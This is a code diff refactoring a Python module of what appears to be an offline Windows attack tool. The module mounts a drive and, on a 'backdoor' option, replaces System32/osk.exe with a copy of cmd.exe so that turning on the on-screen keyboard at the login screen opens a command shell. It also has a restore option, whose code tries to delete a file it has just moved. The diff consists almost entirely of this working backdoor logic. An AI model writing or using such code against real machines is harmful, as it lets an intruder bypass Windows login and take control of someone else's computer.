@@ -12,7 +12,7 @@ import time
 def __main__(drive_name,drive_format):
 	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
 		print("[-] This module does not work with a Bitlocker drive")
-	elif drive_name == None:
+	elif drive_name is None:
 		print("[-] This module needs a drive to work; use 'usedrive'")
 	else:
 		if not os.path.exists("tofu_tmp/windows_filesystem"):
@@ -28,16 +28,15 @@ def __main__(drive_name,drive_format):
 			option2 = input("backdoor/unbackdoor? : ")
 			option2 = option2.lower().strip()
 			if option2 == "backdoor":
-				if not os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe"):
-					if os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/cmd.exe"):
-						print("[+] Moving osk.exe to osk_tofu_backup.exe")
-						shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk.exe","tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe")
-						shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/cmd.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
-						print("[+] Backdoored; Activate it by turning on Onscreen Keyboard")
-					else:
-						print("[-] CMD.exe binary doesn't exist at Windows/System32; Exiting")
-				else:
+				if os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe"):
 					print("[-] OSK backdoor file already exists; looks to already be tofu-backdoored")
+				elif os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/cmd.exe"):
+					print("[+] Moving osk.exe to osk_tofu_backup.exe")
+					shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk.exe","tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe")
+					shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/cmd.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
+					print("[+] Backdoored; Activate it by turning on Onscreen Keyboard")
+				else:
+					print("[-] CMD.exe binary doesn't exist at Windows/System32; Exiting")
 			elif option2 == "unbackdoor":
 				if os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe"):
 					print("[+] Tofu CMD backup exists")
@@ -46,18 +45,17 @@ def __main__(drive_name,drive_format):
 						os.remove("tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
 						shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
 						os.remove("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe")
-						print("[+] Unbackdoored")
 					else:
 						print("[?] It seems OSK.exe has been removed. Replacing OSK.exe with 'osk_tofu_backup.exe'")
 						shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
-						print("[+] Unbackdoored")
+					print("[+] Unbackdoored")
 				else:
 					print("[-] Tofu CMD backup doesn't exist at Windows/System32/osk_tofu_backup.exe")
 			else:
 				print("[-] Invalid option")
-				
-				
+
+
 		except Exception as open_error:
 			print(f"[-] Error {open_error}")
-		time.sleep(2)	
+		time.sleep(2)
 		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
